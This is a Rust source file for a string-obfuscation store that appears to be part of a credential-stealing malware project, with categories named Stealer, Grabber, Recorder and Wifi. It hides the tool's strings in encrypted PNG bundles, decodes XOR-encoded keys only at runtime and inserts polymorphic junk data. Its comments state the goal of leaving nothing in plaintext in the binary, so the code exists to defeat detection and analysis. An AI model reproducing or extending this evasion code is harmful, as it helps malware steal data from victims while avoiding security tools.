use std::collections::HashMap;
use once_cell::sync::Lazy;
use std::sync::RwLock;
use crate::core::obfuscator::Obfuscator;
use serde_json;

#[derive(Clone, Copy)]
pub enum StringCategory {
    Core, Filesystem, System, Network, Utility, Config,
    Scripts, Desc, Const, Log, Win, CmdMeta, Msg, Wifi, Stealer, Url,
    Grabber, Recorder,
}

impl StringCategory {
    fn as_str(&self) -> &'static str {
        match self {
            Self::Core       => "A1",
            Self::Filesystem => "A2",
            Self::System     => "A3",
            Self::Network    => "A4",
            Self::Utility    => "A5",
            Self::Config     => "A6",
            Self::Scripts    => "A7",
            Self::Desc       => "A8",
            Self::Const      => "A9",
            Self::Log        => "B1",
            Self::Win        => "B2",
            Self::CmdMeta    => "B3",
            Self::Msg        => "B4",
            Self::Wifi       => "B5",
            Self::Stealer    => "B6",
            Self::Url        => "B7",
            Self::Grabber    => "B8",
            Self::Recorder   => "B9",
        }
    }
}

pub struct StegoStore;

static CACHE: Lazy<RwLock<HashMap<String, String>>> = Lazy::new(|| RwLock::new(HashMap::new()));

include!(concat!(env!("OUT_DIR"), "/generated_stego_bundle.rs"));
include!(concat!(env!("OUT_DIR"), "/generated_key_map.rs"));

impl StegoStore {
    pub fn init_polymorphic() {
        use_junk();
        let _ = JUNK_DATA.len();
    }

    /// Resolve a numeric key index to its (cat_code, key_name) at runtime.
    /// The key bytes are XOR-decoded in memory only when needed; nothing is plaintext in the binary.
    fn resolve(idx: u32) -> Option<(String, String)> {
        for &(table_idx, cat_enc, key_enc) in KEY_TABLE {
            if table_idx == idx {
                let cat = cat_enc.iter().map(|&b| b ^ KEY_XOR).collect::<Vec<u8>>();
                let key = key_enc.iter().map(|&b| b ^ KEY_XOR).collect::<Vec<u8>>();
                return Some((
                    String::from_utf8_lossy(&cat).to_string(),
                    String::from_utf8_lossy(&key).to_string(),
                ));
            }
        }
        None
    }

    /// Primary access: look up by random numeric constant (from generated_key_map.rs).
    /// No string key name leaks into the binary via this path.
    pub fn at(idx: u32) -> String {
        {
            let read = CACHE.read().unwrap();
            if let Some(val) = read.get(&idx.to_string()) {
                return val.clone();
            }
        }

        if let Some((cat_code, key_name)) = Self::resolve(idx) {
            // Find category enum from code
            let cat = match cat_code.as_str() {
                "A1" => StringCategory::Core,
                "A2" => StringCategory::Filesystem,
                "A3" => StringCategory::System,
                "A4" => StringCategory::Network,
                "A5" => StringCategory::Utility,
                "A6" => StringCategory::Config,
                "A7" => StringCategory::Scripts,
                "A8" => StringCategory::Desc,
                "A9" => StringCategory::Const,
                "B1" => StringCategory::Log,
                "B2" => StringCategory::Win,
                "B3" => StringCategory::CmdMeta,
                "B4" => StringCategory::Msg,
                "B5" => StringCategory::Wifi,
                "B6" => StringCategory::Stealer,
                "B7" => StringCategory::Url,
                "B8" => StringCategory::Grabber,
                "B9" => StringCategory::Recorder,
                _    => return String::new(),
            };
            let val = Self::get(cat, &key_name);
            CACHE.write().unwrap().insert(idx.to_string(), val.clone());
            val
        } else {
            String::new()
        }
    }

    /// Fallback: access by category + runtime string key (still works, but key string will be in binary if called with literal)
    pub fn get(category: StringCategory, key: &str) -> String {
        let cache_key = format!("{}_{}", category.as_str(), key);

        {
            let read = CACHE.read().unwrap();
            if let Some(val) = read.get(&cache_key) {
                return val.clone();
            }
        }

        let bundle = Self::load_bundle(&category);
        let mut write = CACHE.write().unwrap();

        let mut target_val = String::new();
        for (k, v) in bundle {
            let combined_key = format!("{}_{}", category.as_str(), k);
            if k == key { target_val = v.clone(); }
            write.insert(combined_key, v);
        }

        target_val
    }

    fn load_bundle(category: &StringCategory) -> HashMap<String, String> {
        let (png, nonce, len, bundle_name): (&[u8], &[u8], usize, &str) = match category {
            StringCategory::Core       => (PNG_CORE,     &NONCE_CORE[..],     LEN_CORE,     "CORE"),
            StringCategory::Filesystem => (PNG_FS,       &NONCE_FS[..],       LEN_FS,       "FS"),
            StringCategory::System     => (PNG_SYS,      &NONCE_SYS[..],      LEN_SYS,      "SYS"),
            StringCategory::Network    => (PNG_NET,      &NONCE_NET[..],      LEN_NET,      "NET"),
            StringCategory::Utility    => (PNG_UTIL,     &NONCE_UTIL[..],     LEN_UTIL,     "UTIL"),
            StringCategory::Config     => (PNG_CONFIG,   &NONCE_CONFIG[..],   LEN_CONFIG,   "CONFIG"),
            StringCategory::Scripts    => (PNG_SCRIPTS,  &NONCE_SCRIPTS[..],  LEN_SCRIPTS,  "SCRIPTS"),
            StringCategory::Desc       => (PNG_DESC,     &NONCE_DESC[..],     LEN_DESC,     "DESC"),
            StringCategory::Const      => (PNG_CONST,    &NONCE_CONST[..],    LEN_CONST,    "CONST"),
            StringCategory::Log        => (PNG_LOG,      &NONCE_LOG[..],      LEN_LOG,      "LOG"),
            StringCategory::Win        => (PNG_WIN,      &NONCE_WIN[..],      LEN_WIN,      "WIN"),
            StringCategory::CmdMeta    => (PNG_CMD_META, &NONCE_CMD_META[..], LEN_CMD_META, "CMD_META"),
            StringCategory::Msg        => (PNG_MSG,      &NONCE_MSG[..],      LEN_MSG,      "MSG"),
            StringCategory::Wifi       => (PNG_WIFI,     &NONCE_WIFI[..],     LEN_WIFI,     "WIFI"),
            StringCategory::Stealer    => (PNG_STEALER,  &NONCE_STEALER[..],  LEN_STEALER,  "STEALER"),
            StringCategory::Url        => (PNG_URL,      &NONCE_URL[..],      LEN_URL,      "URL"),
            StringCategory::Grabber    => (PNG_GRABBER,  &NONCE_GRABBER[..],  LEN_GRABBER,  "GRABBER"),
            StringCategory::Recorder   => (PNG_RECORDER, &NONCE_RECORDER[..], LEN_RECORDER, "RECORDER"),
        };

        let decrypted_json = Obfuscator::extract_and_decrypt(png, nonce.try_into().unwrap(), len, bundle_name);
        serde_json::from_str(&decrypted_json).unwrap_or_default()
    }
}
